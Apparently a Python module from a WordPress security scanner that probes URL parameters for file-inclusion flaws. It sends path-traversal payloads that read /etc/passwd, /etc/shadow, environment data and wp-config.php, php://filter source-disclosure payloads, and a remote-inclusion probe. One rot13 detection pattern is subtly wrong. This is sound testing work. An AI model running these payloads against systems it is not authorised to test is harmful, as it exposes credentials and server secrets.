# Module for WordPress File Inclusion (LFI/RFI) Checks
import requests
import re
import base64
from urllib.parse import urlparse, parse_qs, urlencode, quote_plus
from core.utils import make_request

# Common parameters that might be vulnerable to LFI/RFI
LFI_RFI_TARGET_PARAMS = [
    "file", "page", "template", "include", "document", "doc", "path", "root", "item",
    "pg", "style", "pdf", "view", "show", "load", "lang", "layout", "content", "cat"
]

# Expanded LFI payloads and expected content patterns
LFI_PAYLOADS = {
    # Linux
    "../../../../../../../../../../etc/passwd": re.compile(r"root:x:0:0:"),
    "../../../../../../../../../../etc/shadow": re.compile(r"root:[*\$].*?:"), # Might be permission denied
    "../../../../../../../../../../proc/self/environ": re.compile(r"USER=|HOME=|PATH="),
    "../../../../../../../../../../var/log/auth.log": re.compile(r"session opened for user|received disconnect", re.IGNORECASE), # Common log patterns
    # Windows
    "../../../../../../../../../../boot.ini": re.compile(r"\[boot loader\]", re.IGNORECASE),
    "../../../../../../../../../../windows/win.ini": re.compile(r"\[fonts\]|\[extensions\]|\[mci extensions\]", re.IGNORECASE),
    "../../../../../../../../../../windows/system32/drivers/etc/hosts": re.compile(r"localhost|127\.0\.0\.1"),
    # WordPress specific (relative to typical include location)
    "wp-config.php": re.compile(r"DB_NAME|DB_USER|DB_PASSWORD|AUTH_KEY", re.IGNORECASE),
    "../wp-config.php": re.compile(r"DB_NAME|DB_USER|DB_PASSWORD|AUTH_KEY", re.IGNORECASE),
    "../../wp-config.php": re.compile(r"DB_NAME|DB_USER|DB_PASSWORD|AUTH_KEY", re.IGNORECASE),
    "../../../wp-config.php": re.compile(r"DB_NAME|DB_USER|DB_PASSWORD|AUTH_KEY", re.IGNORECASE),
}

# PHP filter LFI payloads to read source. Target file needs to be appended.
PHP_FILTER_LFI_PAYLOAD_TEMPLATES = [
    "php://filter/convert.base64-encode/resource={target_file}",
    "php://filter/read=string.rot13/resource={target_file}",
    # "zip://./archive.zip#{target_file}" # Requires zip extension and a known archive
    # "data://text/plain;base64," + base64.b64encode(b"<?php phpinfo(); ?>").decode() # For RCE if data wrapper allowed
]
# Expected patterns for PHP filter LFI (e.g., base64 encoded PHP tags, or known PHP keywords)
PHP_FILTER_SUCCESS_PATTERNS = [
    re.compile(r"[a-zA-Z0-9+/=]{20,}"), # Base64 like string
    re.compile(r"<\?cuc|\?/>|shapgvba|rpub|vaqhrerg", re.IGNORECASE) # rot13 of <?php | ?> | function | echo | require
]


# Basic RFI payload (points to a non-existent resource on a public domain)
RFI_PAYLOAD_URL = "http://example.com/rfi_test_payload_clinetest.txt"
# RFI test content to host on your own server for better detection
# RFI_CALLBACK_MARKER = "CLINERFICALLBACKMARKER"
# RFI_ADVANCED_PAYLOAD = f"http://your-callback-server.com/rfi_check.php?m={RFI_CALLBACK_MARKER}"


def analyze_file_inclusion(state, config, target_url):
    """
    Performs enhanced heuristic checks for potential LFI/RFI vulnerabilities.
    This is NOT a comprehensive file inclusion scanner.
    """
    module_key = "wp_analyzer"
    findings_key = "file_inclusion"
    findings = state.get_specific_finding(module_key, findings_key, {
        "status": "Running",
        "details": "Performing enhanced heuristic LFI/RFI checks...",
        "potential_lfi_points": [],
        "potential_rfi_points": [],
        "recommendation": "Use dedicated LFI/RFI scanning tools and techniques for comprehensive analysis."
    })

    print("    [i] Performing enhanced LFI/RFI heuristic checks...")
    
    parsed_target_url = urlparse(target_url)
    original_query_params = parse_qs(parsed_target_url.query)
    lfi_points = []
    rfi_points = []

    if not original_query_params:
        findings["details"] = "No query parameters in target URL to test for LFI/RFI."
        findings["status"] = "Completed"
        state.update_specific_finding(module_key, findings_key, findings)
        print("      [i] No query parameters in target URL for LFI/RFI checks.")
        return

    print(f"      Checking {len(original_query_params)} parameter(s) in URL: {target_url}")
    for param, values in original_query_params.items():
        if param.lower() not in LFI_RFI_TARGET_PARAMS:
            continue

        original_value = values[0] # Test with the first value if multiple exist
        param_lfi_found = False

        # Test for LFI (Direct file content inclusion)
        print(f"        Testing LFI (direct inclusion) for param '{param}'...")
        for lfi_payload, content_pattern in LFI_PAYLOADS.items():
            modified_params = {k: v[0] for k, v in original_query_params.items()}
            modified_params[param] = lfi_payload
            test_url = parsed_target_url._replace(query=urlencode(modified_params)).geturl()
            
            print(f"          Trying LFI payload: {lfi_payload[:60]}...")
            try:
                response = make_request(test_url, config, method="GET", timeout=7)
                if response and response.text:
                    if content_pattern.search(response.text):
                        point = {"url": test_url, "parameter": param, "payload": lfi_payload, "type": "Direct LFI",
                                 "observation": f"Content pattern '{content_pattern.pattern}' matched."}
                        lfi_points.append(point)
                        param_lfi_found = True
                        print(f"            [!!!] Potential Direct LFI: {param} with {lfi_payload}")
                        break 
            except Exception as e:
                print(f"            [-] Error testing LFI: {e}")
        
        # Test for LFI (PHP Filter Source Disclosure)
        if not param_lfi_found: # Only if direct LFI wasn't found for this param
            print(f"        Testing LFI (PHP filter) for param '{param}'...")
            # Target files for PHP filter - could be the original param value if it looks like a file path, or default files
            target_files_for_filter = set([str(original_value)]) if re.match(r"[\w\-\./]+\.php", str(original_value)) else set()
            target_files_for_filter.update(["index.php", "wp-config.php"]) # Add common targets

            for target_file in target_files_for_filter:
                if param_lfi_found: break
                for filter_template in PHP_FILTER_LFI_PAYLOAD_TEMPLATES:
                    lfi_payload = filter_template.format(target_file=target_file)
                    modified_params = {k: v[0] for k, v in original_query_params.items()}
                    modified_params[param] = lfi_payload
                    test_url = parsed_target_url._replace(query=urlencode(modified_params)).geturl()

                    print(f"          Trying PHP Filter LFI: {lfi_payload[:70]}...")
                    try:
                        response = make_request(test_url, config, method="GET", timeout=7)
                        if response and response.text:
                            for success_pattern in PHP_FILTER_SUCCESS_PATTERNS:
                                if success_pattern.search(response.text):
                                    point = {"url": test_url, "parameter": param, "payload": lfi_payload, "type": "PHP Filter LFI",
                                             "observation": f"PHP filter pattern '{success_pattern.pattern}' matched."}
                                    lfi_points.append(point)
                                    param_lfi_found = True
                                    print(f"            [!!!] Potential PHP Filter LFI: {param} with {lfi_payload}")
                                    break 
                            if param_lfi_found: break
                    except Exception as e:
                        print(f"            [-] Error testing PHP Filter LFI: {e}")
        
        # Test for RFI (only if no LFI found for this param)
        if not param_lfi_found:
            print(f"        Testing RFI for param '{param}'...")
            modified_params_rfi = {k: v[0] for k, v in original_query_params.items()}
            modified_params_rfi[param] = RFI_PAYLOAD_URL # Use the example.com URL
            test_url_rfi = parsed_target_url._replace(query=urlencode(modified_params_rfi)).geturl()
            
            print(f"          Trying RFI payload: {RFI_PAYLOAD_URL}...")
            try:
                response = make_request(test_url_rfi, config, method="GET", timeout=10) # Longer timeout for external req
                if response and response.text:
                    # Look for errors indicating an attempt to fetch the remote URL
                    # This is very basic. True RFI needs OOB or specific content from the remote URL.
                    rfi_error_patterns = [
                        r"failed to open stream: HTTP request failed",
                        r"include\(" + re.escape(RFI_PAYLOAD_URL) + r"\): failed to open stream",
                        r"failed opening required '" + re.escape(RFI_PAYLOAD_URL) + r"'",
                        r"URL file-access is disabled in the server configuration", # Indicates allow_url_fopen/include might be off
                        r"Connection timed out after \d+ milliseconds" # If it tries to connect
                    ]
                    for pattern_str in rfi_error_patterns:
                        if re.search(pattern_str, response.text, re.IGNORECASE):
                            point = {"url": test_url_rfi, "parameter": param, "payload": RFI_PAYLOAD_URL, "type": "RFI",
                                     "observation": f"RFI error pattern matched: '{pattern_str}'"}
                            rfi_points.append(point)
                            print(f"            [!!!] Potential RFI (Error Indication): {param} with {RFI_PAYLOAD_URL}")
                            break 
            except requests.exceptions.Timeout:
                 point = {"url": test_url_rfi, "parameter": param, "payload": RFI_PAYLOAD_URL, "type": "RFI",
                                     "observation": "Request to include remote URL timed out. Could indicate RFI attempt."}
                 rfi_points.append(point)
                 print(f"            [!!!] Potential RFI (Timeout Indication): {param} with {RFI_PAYLOAD_URL}")
            except Exception as e:
                print(f"            [-] Error testing RFI: {e}")

    # Finalize findings
    if lfi_points: findings["potential_lfi_points"] = lfi_points
    if rfi_points: findings["potential_rfi_points"] = rfi_points

    details_parts = []
    if lfi_points: details_parts.append(f"{len(lfi_points)} potential LFI point(s)")
    if rfi_points: details_parts.append(f"{len(rfi_points)} potential RFI point(s)")

    if details_parts:
        findings["details"] = f"Found {', '.join(details_parts)}. Manual verification and specialized tools are CRUCIAL."
        state.add_remediation_suggestion("file_inclusion_heuristic_enhanced", {
            "source": "WP Analyzer (File Inclusion Heuristic - Enhanced)",
            "description": f"Enhanced heuristic checks suggest potential File Inclusion vulnerabilities: {', '.join(details_parts)}.",
            "severity": "High",
            "remediation": "Immediately investigate and fix. Avoid using user input in file paths. Use whitelists for allowed files/paths. Disable `allow_url_fopen` and `allow_url_include` if RFI is possible and not needed. Conduct thorough testing with specialized tools."
        })
    else:
        findings["details"] = "No obvious LFI/RFI indicators from enhanced heuristics. This does not rule out File Inclusion. Use specialized tools."

    findings["status"] = "Completed"
    state.update_specific_finding(module_key, findings_key, findings)
    print(f"    [+] Enhanced LFI/RFI heuristic checks finished. Details: {findings['details']}")
